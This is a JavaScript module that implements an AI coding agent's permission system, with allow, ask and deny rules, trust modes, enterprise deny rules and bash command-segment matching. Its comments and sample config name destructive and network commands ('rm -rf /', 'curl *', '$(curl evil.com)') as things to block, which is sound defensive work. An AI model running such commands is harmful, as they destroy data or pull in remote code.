// Mercury Code - Permission Rules System
// Modeled after Claude Code's allow/ask/deny permission rules with full parity.
//
// Permission modes (matching Claude Code):
//   readonly       — Read-only analysis: only read tools allowed
//   approval       — Default: prompts user on first use of write tools
//   acceptEdits    — Auto-approves file edits (Edit, Write), still asks for Bash
//   open           — All tools auto-allowed
//   dontAsk        — Auto-denies everything not explicitly pre-approved
//
// Permission evaluation pipeline (matching Claude Code):
//   1. Hooks (PreToolUse) — can allow, deny, or pass through
//   2. deny rules — block regardless of other rules
//   3. allow rules — permit if matched
//   4. ask rules — prompt for approval
//   5. Permission mode default — apply the active mode's behavior
//   6. canUseTool callback — runtime custom logic (optional)
//
// Rule format:
//   "ToolName"               — matches all uses of that tool
//   "ToolName(specifier)"    — matches tool with specific argument pattern
//   "Bash(git *)"            — matches Bash commands starting with "git "
//   "Write(src/**)"          — matches Write to files in src/
//   "Agent(explore)"         — matches spawning explore-type agents
//
// Settings precedence (highest to lowest):
//   1. Managed settings (.mercury/managed-settings.json) — enterprise, cannot be overridden
//   2. CLI arguments — temporary, single session
//   3. Local project settings (.mercury/settings.local.json) — personal, gitignored
//   4. Shared project settings (.mercury/settings.json) — team-wide, version controlled
//   5. User settings (~/.mercury/permissions.json) — personal defaults
//
// Configuration:
//   .mercury/permissions.json or ~/.mercury/permissions.json
//   {
//     "allow": ["Read", "Glob", "Grep", "Bash(git *)"],
//     "ask":   ["Write", "Edit", "Bash"],
//     "deny":  ["Bash(rm -rf *)", "Bash(curl *)"]
//   }

import { readFile } from "node:fs/promises";
import { appendFile, mkdir } from "node:fs/promises";
import path from "node:path";
import os from "node:os";
import { debugLog } from "./utils/debug-log.js";

// ── Permission Results ───────────────────────────────────────────────────────

export const PERMISSION_ALLOW = "allow";
export const PERMISSION_ASK = "ask";
export const PERMISSION_DENY = "deny";

// ── Permission Modes (matching Claude Code) ──────────────────────────────────

export const MODE_READONLY = "readonly";
export const MODE_APPROVAL = "approval";
export const MODE_ACCEPT_EDITS = "acceptEdits";
export const MODE_AI_SAFETY_DECIDE = "aiSafetyDecide";
export const MODE_OPEN = "open";
export const MODE_DONT_ASK = "dontAsk";

export const VALID_MODES = [MODE_READONLY, MODE_APPROVAL, MODE_ACCEPT_EDITS, MODE_AI_SAFETY_DECIDE, MODE_OPEN, MODE_DONT_ASK];

// Trust mode privilege levels (higher = more restricted).
// Used by _clampTrustMode in subagent.js and mergePermissions here.
// aiSafetyDecide sits between open (0) and acceptEdits (1) — nearly open but
// with AI-powered safety review instead of user approval.
export const TRUST_LEVELS = {
  [MODE_OPEN]: 0,
  [MODE_AI_SAFETY_DECIDE]: 0.5,
  [MODE_ACCEPT_EDITS]: 1,
  [MODE_APPROVAL]: 2,
  [MODE_DONT_ASK]: 3,
  [MODE_READONLY]: 4,
};

// ── PermissionManager ────────────────────────────────────────────────────────

export class PermissionManager {
  /**
   * @param {object} [options]
   * @param {string} [options.workspace] - Project root
   * @param {string} [options.trustMode] - Base trust mode
   * @param {Function} [options.canUseTool] - Runtime permission callback
   * @param {boolean} [options.auditLog] - Enable permission audit logging
   */
  constructor(options = {}) {
    this.workspace = options.workspace || process.cwd();
    this.trustMode = options.trustMode || MODE_APPROVAL;

    /** @type {string[]} Rules that auto-allow */
    this.allowRules = [];
    /** @type {string[]} Rules that require user approval */
    this.askRules = [];
    /** @type {string[]} Rules that block entirely */
    this.denyRules = [];

    /** @type {Function|null} Runtime permission callback: (toolName, input, context) => PermissionResult */
    this._canUseTool = options.canUseTool || null;

    /** @type {boolean} Enable audit logging */
    this._auditLog = options.auditLog || false;
    /** @type {string|null} Audit log directory */
    this._auditDir = null;

    this._loaded = false;
  }

  /**
   * Load permission rules from project and global config files.
   * Settings precedence (lowest to highest):
   *   1. User global: ~/.mercury/permissions.json
   *   2. Project shared: .mercury/settings.json (permissions key)
   *   3. Project local: .mercury/settings.local.json (permissions key)
   *   4. Legacy: .mercury/permissions.json (backwards compatibility)
   *   5. Managed: .mercury/managed-settings.json (enterprise, additive deny)
   */
  async load() {
    this.allowRules = [];
    this.askRules = [];
    this.denyRules = [];
    this._managedDenyRules = new Set();

    // 1. User global: ~/.mercury/permissions.json
    const globalPath = path.join(os.homedir(), ".mercury", "permissions.json");
    await this._loadFromFile(globalPath);

    // 2. Project shared: .mercury/settings.json → permissions
    // This file is version-controlled; allow rules are downgraded to ask
    // to prevent project repos from auto-allowing operations.
    const sharedSettings = path.join(this.workspace, ".mercury", "settings.json");
    await this._loadFromSettings(sharedSettings, { isProjectLevel: true });

    // 3. Project local: .mercury/settings.local.json → permissions
    const localSettings = path.join(this.workspace, ".mercury", "settings.local.json");
    await this._loadFromSettings(localSettings, { isProjectLevel: false });

    // 4. Legacy: .mercury/permissions.json (backwards compatibility)
    const legacyPath = path.join(this.workspace, ".mercury", "permissions.json");
    await this._loadFromFile(legacyPath);

    // 5. Managed: .mercury/managed-settings.json (enterprise overrides)
    // Managed deny rules are ADDITIVE and cannot be removed by user/project rules
    const managedPath = path.join(this.workspace, ".mercury", "managed-settings.json");
    await this._loadManagedRules(managedPath);

    this._loaded = true;
  }

  /**
   * Load rules from a permissions JSON file.
   */
  async _loadFromFile(filePath) {
    try {
      const data = await readFile(filePath, "utf-8");
      const config = JSON.parse(data);
      this._mergeRules(config);
    } catch (err) {
      debugLog("PermissionManager._loadFromFile", err);
    }
  }

  /**
   * Load rules from a settings JSON file (permissions key).
   * @param {string} filePath
   * @param {object} [options]
   * @param {boolean} [options.isProjectLevel=false] - If true, downgrade allow rules to ask
   */
  async _loadFromSettings(filePath, options = {}) {
    const isProjectLevel = options.isProjectLevel || false;
    try {
      const data = await readFile(filePath, "utf-8");
      const settings = JSON.parse(data);
      if (settings.permissions) {
        if (isProjectLevel && Array.isArray(settings.permissions.allow)) {
          // Project-level (version controlled) allow rules are downgraded to ask rules.
          // This prevents project repos from auto-allowing operations for anyone who clones.
          this.askRules.push(...settings.permissions.allow.filter(r => typeof r === 'string'));
          // Merge deny and ask rules normally
          const { allow, ...rest } = settings.permissions;
          this._mergeRules(rest);
        } else {
          this._mergeRules(settings.permissions);
        }
      }
      // Apply defaultMode if specified — but only if it's MORE restrictive
      // than the current trust mode (prevents project settings from escalating
      // a CLI-provided --trust-mode to a more permissive level)
      if (settings.defaultMode && VALID_MODES.includes(settings.defaultMode)) {
        const newLevel = TRUST_LEVELS[settings.defaultMode] ?? 2;
        const currentLevel = TRUST_LEVELS[this.trustMode] ?? 2;
        if (newLevel > currentLevel) {
          this.trustMode = settings.defaultMode;
        }
      }
    } catch (err) {
      debugLog("PermissionManager._loadFromSettings", err);
    }
  }

  /**
   * Load managed (enterprise) rules. Deny rules are additive and final.
   */
  async _loadManagedRules(filePath) {
    try {
      const data = await readFile(filePath, "utf-8");
      const managed = JSON.parse(data);
      if (managed.permissions) {
        // Managed deny rules are always additive and protected from removeRule()
        if (Array.isArray(managed.permissions.deny)) {
          const denyRules = managed.permissions.deny.filter(r => typeof r === 'string');
          this.denyRules.push(...denyRules);
          // Track managed deny rules so removeRule() cannot remove them
          if (!this._managedDenyRules) this._managedDenyRules = new Set();
          for (const rule of denyRules) {
            this._managedDenyRules.add(rule);
          }
        }
        // Managed can also set allow/ask
        if (Array.isArray(managed.permissions.allow)) {
          this.allowRules.push(...managed.permissions.allow.filter(r => typeof r === 'string'));
        }
      }
      // Enterprise can disable permissive modes — downgrade any mode
      // less restrictive than approval to approval
      if (managed.disableBypassPermissionsMode) {
        if (TRUST_LEVELS[this.trustMode] < TRUST_LEVELS[MODE_APPROVAL]) {
          this.trustMode = MODE_APPROVAL;
        }
      }
    } catch (err) {
      debugLog("PermissionManager._loadManagedRules", err);
    }
  }

  /**
   * Merge rules from a config object.
   */
  _mergeRules(config) {
    if (Array.isArray(config.allow)) {
      this.allowRules.push(...config.allow.filter(r => typeof r === 'string'));
    }
    if (Array.isArray(config.deny)) {
      this.denyRules.push(...config.deny.filter(r => typeof r === 'string'));
    }
    if (Array.isArray(config.ask)) {
      this.askRules.push(...config.ask.filter(r => typeof r === 'string'));
    }
  }

  /**
   * Check the permission for a tool call.
   * Evaluation order (matching Claude Code pipeline):
   *   1. deny rules (highest priority)
   *   2. allow rules
   *   3. ask rules
   *   4. permission mode default
   *   5. canUseTool callback (if set)
   *
   * @param {string} toolName - The tool being called (e.g., "Bash", "Write")
   * @param {object} toolInput - The tool's input arguments
   * @param {object} [context] - Additional context (agentId, etc.)
   * @returns {{ decision: string, rule?: string, source?: string }}
   */
  check(toolName, toolInput = {}, context = {}) {
    // 1. Check deny rules first (highest priority)
    for (const rule of this.denyRules) {
      if (this._matches(rule, toolName, toolInput, { isDenyRule: true })) {
        this._audit(toolName, PERMISSION_DENY, rule, "deny_rule", context);
        return { decision: PERMISSION_DENY, rule, source: "deny_rule" };
      }
    }

    // 2. Check allow rules
    for (const rule of this.allowRules) {
      if (this._matches(rule, toolName, toolInput)) {
        this._audit(toolName, PERMISSION_ALLOW, rule, "allow_rule", context);
        return { decision: PERMISSION_ALLOW, rule, source: "allow_rule" };
      }
    }

    // 3. Check ask rules
    for (const rule of this.askRules) {
      if (this._matches(rule, toolName, toolInput)) {
        this._audit(toolName, PERMISSION_ASK, rule, "ask_rule", context);
        return { decision: PERMISSION_ASK, rule, source: "ask_rule" };
      }
    }

    // 4. Fall through to trust mode defaults
    const modeDefault = this._trustModeDefault(toolName);
    this._audit(toolName, modeDefault.decision, null, `mode_${this.trustMode}`, context);
    return { ...modeDefault, source: `mode_${this.trustMode}` };
  }

  /**
   * Async check with canUseTool callback support.
   * Use this when you need the full evaluation pipeline including the callback.
   *
   * @param {string} toolName
   * @param {object} toolInput
   * @param {object} [context]
   * @returns {Promise<{ decision: string, rule?: string, source?: string, updatedInput?: object }>}
   */
  async checkAsync(toolName, toolInput = {}, context = {}) {
    // Ensure rules are loaded if a background reload was triggered
    if (this._pendingLoad) {
      await this._pendingLoad;
      this._pendingLoad = null;
    }
    // Run synchronous checks first
    const syncResult = this.check(toolName, toolInput, context);

    // If canUseTool callback is set, run it
    if (this._canUseTool && syncResult.decision !== PERMISSION_DENY) {
      try {
        const cbResult = await this._canUseTool(toolName, toolInput, {
          ...context,
          ruleDecision: syncResult.decision,
          ruleMatched: syncResult.rule,
        });

        if (cbResult) {
          if (cbResult.behavior === "deny") {
            this._audit(toolName, PERMISSION_DENY, cbResult.message, "canUseTool", context);
            return { decision: PERMISSION_DENY, rule: cbResult.message, source: "canUseTool" };
          }
          if (cbResult.behavior === "allow") {
            this._audit(toolName, PERMISSION_ALLOW, null, "canUseTool", context);
            return {
              decision: PERMISSION_ALLOW,
              source: "canUseTool",
              updatedInput: cbResult.updatedInput || null,
            };
          }
        }
      } catch (err) {
        debugLog("PermissionManager.checkAsync.canUseTool", err);
      }
    }

    return syncResult;
  }

  /**
   * Get the default permission based on trustMode.
   * Matches Claude Code's 5 permission modes.
   * @param {string} toolName
   * @returns {{ decision: string }}
   */
  _trustModeDefault(toolName) {
    const READ_TOOLS = new Set([
      "Read", "Glob", "Grep", "ListDir", "Diff", "Lsp", "AstSearch",
    ]);

    const EDIT_TOOLS = new Set(["Write", "Edit", "Patch"]);

    switch (this.trustMode) {
      // ── open: everything allowed ──
      case MODE_OPEN:
        return { decision: PERMISSION_ALLOW };

      // ── aiSafetyDecide: all tools allowed at permission level ──
      // (actual safety enforcement happens via the AI safety judge callback)
      case MODE_AI_SAFETY_DECIDE:
        return { decision: PERMISSION_ALLOW };

      // ── acceptEdits: auto-approve file edits, ask for Bash/Fetch ──
      case MODE_ACCEPT_EDITS: {
        if (READ_TOOLS.has(toolName)) return { decision: PERMISSION_ALLOW };
        if (EDIT_TOOLS.has(toolName)) return { decision: PERMISSION_ALLOW };
        // Bash with safe file operations are auto-approved
        return { decision: PERMISSION_ASK };
      }

      // ── approval (default): ask for write tools ──
      case MODE_APPROVAL:
      default: {
        if (READ_TOOLS.has(toolName)) return { decision: PERMISSION_ALLOW };
        if (toolName === "Fetch") return { decision: PERMISSION_ASK };
        return { decision: PERMISSION_ASK };
      }

      // ── dontAsk: deny everything not explicitly allowed ──
      case MODE_DONT_ASK: {
        if (READ_TOOLS.has(toolName)) return { decision: PERMISSION_ALLOW };
        // Everything else is denied — user must add explicit allow rules
        return { decision: PERMISSION_DENY };
      }

      // ── readonly: only read tools ──
      case MODE_READONLY: {
        if (READ_TOOLS.has(toolName)) return { decision: PERMISSION_ALLOW };
        if (toolName === "Fetch") return { decision: PERMISSION_ASK };
        return { decision: PERMISSION_DENY };
      }
    }
  }

  // ── Rule Matching ────────────────────────────────────────────────────────

  /**
   * Check if a rule matches a tool call.
   *
   * Rule formats:
   *   "ToolName"            — matches all calls to that tool
   *   "ToolName(*)"         — same as above
   *   "ToolName(specifier)" — matches if the specifier matches the tool's primary argument
   *
   * Specifier matching by tool:
   *   Bash:  matches against the command string (glob patterns)
   *   Write/Edit/Patch/Read: matches against file_path (gitignore-style patterns)
   *   Fetch: matches against the URL
   *   Agent/SubAgent: matches against agent_type
   *
   * @param {string} rule
   * @param {string} toolName
   * @param {object} toolInput
   * @returns {boolean}
   */
  _matches(rule, toolName, toolInput, options = {}) {
    const parenIdx = rule.indexOf("(");
    let ruleToolName, specifier;

    if (parenIdx === -1) {
      ruleToolName = rule.trim();
      specifier = null;
    } else {
      ruleToolName = rule.slice(0, parenIdx).trim();
      specifier = rule.slice(parenIdx + 1, -1).trim();
    }

    // Tool name must match (case-insensitive)
    if (ruleToolName.toLowerCase() !== toolName.toLowerCase()) {
      return false;
    }

    // No specifier = match all uses of this tool
    if (!specifier || specifier === "*") {
      return true;
    }

    // Match specifier against the tool's primary argument
    const primaryArg = this._getPrimaryArg(toolName, toolInput);
    if (!primaryArg) return false;

    // For Bash commands, decompose at shell operators and check each segment.
    // This prevents "git status && rm -rf /" matching a "Bash(git *)" allow rule.
    if (toolName.toLowerCase() === "bash") {
      return this._matchBashSegments(specifier, primaryArg, options.isDenyRule);
    }

    return this._globMatch(specifier, primaryArg);
  }

  /**
   * Get the primary argument for a tool (used for specifier matching).
   */
  _getPrimaryArg(toolName, toolInput) {
    switch (toolName.toLowerCase()) {
      case "bash":
        return toolInput.command || null;
      case "write":
      case "read":
      case "edit":
      case "patch":
        return toolInput.file_path || null;
      case "fetch":
        return toolInput.url || null;
      case "glob":
        return toolInput.pattern || null;
      case "grep":
        return toolInput.pattern || null;
      case "subagent":
      case "agent":
        return toolInput.agent_type || toolInput.task || null;
      default:
        return null;
    }
  }

  /**
   * Decompose a bash command at shell operators and check each segment.
   * For allow rules: ALL segments must match (prevents "git * && rm -rf /").
   * For deny rules: ANY segment match is sufficient.
   * @param {string} specifier - The glob pattern
   * @param {string} command - The full bash command
   * @returns {boolean}
   */
  _matchBashSegments(specifier, command, isDenyRule = false) {
    // Check for dangerous shell metacharacters (command substitution, backticks, variable expansion)
    const strippedCmd = command
      .replace(/\$\([^)]*\)/g, ' ')  // Remove $(...)
      .replace(/`[^`]*`/g, ' ')      // Remove backticks
      .replace(/\$\{[^}]*\}/g, ' ')  // Remove ${...}
      .replace(/\([^)]*\)/g, ' ')    // Remove subshells
      .trim();

    if (isDenyRule) {
      // For deny rules: if command contains metacharacters and matches, deny it
      if (strippedCmd !== command && this._globMatch(specifier, command)) {
        return true; // The full command matches and contains shell metacharacters
      }
    } else {
      // For allow rules: if command contains metacharacters, reject the match
      // This prevents commands like `git status $(curl evil.com)` from matching "Bash(git *)"
      if (strippedCmd !== command) {
        return false;
      }
    }

    // Split at shell operators: &&, ||, ;, | (but not ||= or &&=)
    const segments = command
      .split(/\s*(?:&&|\|\||[;\n|])\s*/)
      .map((s) => s.trim())
      .filter(Boolean);

    // If no operators, just match the whole command
    if (segments.length <= 1) {
      return this._globMatch(specifier, command);
    }

    // For deny rules: ANY segment matching is sufficient to deny.
    // This prevents "echo noop && rm -rf /" bypassing a "Bash(rm -rf *)" deny rule.
    if (isDenyRule) {
      return segments.some((seg) => this._globMatch(specifier, seg));
    }

    // For allow/ask rules: ALL segments must match the specifier.
    // This prevents "git status && rm -rf /" matching a "Bash(git *)" allow rule.
    return segments.every((seg) => this._globMatch(specifier, seg));
  }

  /**
   * Glob-like pattern matching.
   * Supports: * (matches anything), ** (same as * for paths), ? (single char)
   *
   * Security: includes ReDoS protections:
   *   - Pattern length limit (200 chars) to prevent abuse
   *   - Consecutive stars collapsed to prevent nested quantifiers
   *   - Non-greedy, non-backtracking character classes instead of .*
   */
  _globMatch(pattern, str) {
    // ReDoS protection: reject excessively long patterns
    if (pattern.length > 200) return false;

    // Collapse consecutive stars to prevent nested quantifier patterns (e.g. ***)
    pattern = pattern.replace(/\*{2,}/g, "**");

    let regex = "^";
    let i = 0;
    while (i < pattern.length) {
      const ch = pattern[i];
      if (ch === "*") {
        if (pattern[i + 1] === "*") {
          // ** matches anything including whitespace (non-greedy)
          regex += "[\\s\\S]*?";
          i += 2;
          if (pattern[i] === "/") i++;
        } else {
          // * matches anything (including /) — permission rules match command strings,
          // not file paths, so / should be matched by single * as well
          regex += "[\\s\\S]*?";
          i++;
        }
      } else if (ch === "?") {
        regex += ".";
        i++;
      } else if (".+^${}()|[]\\".includes(ch)) {
        regex += "\\" + ch;
        i++;
      } else {
        regex += ch;
        i++;
      }
    }
    regex += "$";

    try {
      return new RegExp(regex).test(str);
    } catch (err) {
      debugLog("PermissionManager._globMatch", err);
      return str.includes(pattern);
    }
  }

  // ── Audit Logging ────────────────────────────────────────────────────────

  /**
   * Log a permission decision for audit purposes.
   */
  _audit(toolName, decision, rule, source, context) {
    if (!this._auditLog) return;

    const entry = {
      ts: new Date().toISOString(),
      tool: toolName,
      decision,
      rule: rule || null,
      source,
      agent: context?.agentId || "main",
    };

    // Fire-and-forget to avoid blocking
    this._writeAuditEntry(entry).catch(() => {});
  }

  async _writeAuditEntry(entry) {
    if (!this._auditDir) {
      this._auditDir = path.join(this.workspace, ".mercury", "audit");
      try { await mkdir(this._auditDir, { recursive: true }); } catch (err) { debugLog("PermissionManager._writeAuditEntry.mkdir", err); }
    }
    const logPath = path.join(this._auditDir, "permissions.log");
    await appendFile(logPath, JSON.stringify(entry) + "\n", "utf-8");
  }

  // ── Serialization ────────────────────────────────────────────────────────

  /**
   * Export rules for passing to sub-agents.
   * @returns {object}
   */
  toConfig() {
    return {
      allow: [...this.allowRules],
      deny: [...this.denyRules],
      ask: [...this.askRules],
      _managedDenyRules: this._managedDenyRules ? [...this._managedDenyRules] : [],
    };
  }

  /**
   * Import rules from a config object (e.g., from parent agent).
   * Note: _managedDenyRules are NOT accepted from external config.
   * Managed deny rules can only be set internally via _loadManagedRules()
   * to prevent untrusted sources from manipulating the protected deny list.
   * @param {object} config
   */
  fromConfig(config) {
    if (config.allow) this.allowRules = [...config.allow].filter(r => typeof r === 'string');
    if (config.deny) this.denyRules = [...config.deny].filter(r => typeof r === 'string');
    if (config.ask) this.askRules = [...config.ask].filter(r => typeof r === 'string');
    // Do NOT accept _managedDenyRules from config — these are internally managed
    // and must only be set by _loadManagedRules() from trusted enterprise settings.
    this._loaded = true;
  }

  /**
   * Merge rules from parent agent (additive — inherit + extend).
   * Parent deny rules are always inherited. Parent allow/ask rules are inherited
   * but can be overridden by child deny rules.
   * @param {object} parentConfig - { allow, ask, deny }
   * @param {object} [childConfig] - { allow, ask, deny } to merge on top
   */
  mergeFromParent(parentConfig, childConfig = null) {
    // Start with parent rules
    if (parentConfig.deny) this.denyRules.push(...parentConfig.deny);
    if (parentConfig.allow) this.allowRules.push(...parentConfig.allow);
    if (parentConfig.ask) this.askRules.push(...parentConfig.ask);

    // Merge child-specific rules on top
    if (childConfig) {
      if (childConfig.deny) this.denyRules.push(...childConfig.deny);
      if (childConfig.allow) this.allowRules.push(...childConfig.allow);
      if (childConfig.ask) this.askRules.push(...childConfig.ask);
    }

    this._loaded = true;
  }

  /**
   * Add a rule dynamically at runtime.
   * @param {string} decision - 'allow', 'ask', or 'deny'
   * @param {string} rule - The rule string (e.g., "Bash(git *)")
   */
  addRule(decision, rule) {
    switch (decision) {
      case PERMISSION_ALLOW:
        if (!this.allowRules.includes(rule)) this.allowRules.push(rule);
        break;
      case PERMISSION_ASK:
        if (!this.askRules.includes(rule)) this.askRules.push(rule);
        break;
      case PERMISSION_DENY:
        if (!this.denyRules.includes(rule)) this.denyRules.push(rule);
        break;
    }
  }

  /**
   * Remove a rule dynamically at runtime.
   * Managed (enterprise) deny rules cannot be removed.
   * @param {string} rule - The rule string to remove
   */
  removeRule(rule) {
    // Check if this is a managed deny rule (protected from removal)
    if (this._managedDenyRules?.has(rule)) return;
    this.allowRules = this.allowRules.filter((r) => r !== rule);
    this.askRules = this.askRules.filter((r) => r !== rule);
    this.denyRules = this.denyRules.filter((r) => r !== rule);
  }
}

// ── Singleton ────────────────────────────────────────────────────────────────

let _globalPermissions = null;

/**
 * Get or create the global permission manager.
 * @param {object} [options]
 * @returns {PermissionManager}
 */
export function getPermissionManager(options) {
  if (
    !_globalPermissions ||
    (options?.workspace && _globalPermissions.workspace !== options.workspace) ||
    (options?.trustMode && _globalPermissions.trustMode !== options.trustMode)
  ) {
    const needsReload = !!_globalPermissions; // recreating means rules must be reloaded
    _globalPermissions = new PermissionManager(options);
    if (needsReload) {
      // Trigger async reload so callers don't silently use empty rules.
      // The load() promise is awaited lazily in checkAsync() via _pendingLoad.
      _globalPermissions._pendingLoad = _globalPermissions.load().catch(() => {});
    }
  }
  return _globalPermissions;
}

/**
 * Initialize permissions (load config files).
 * @param {string} workspace
 * @param {string} trustMode
 * @returns {Promise<PermissionManager>}
 */
export async function initPermissions(workspace, trustMode) {
  const pm = getPermissionManager({ workspace, trustMode });
  await pm.load();
  return pm;
}
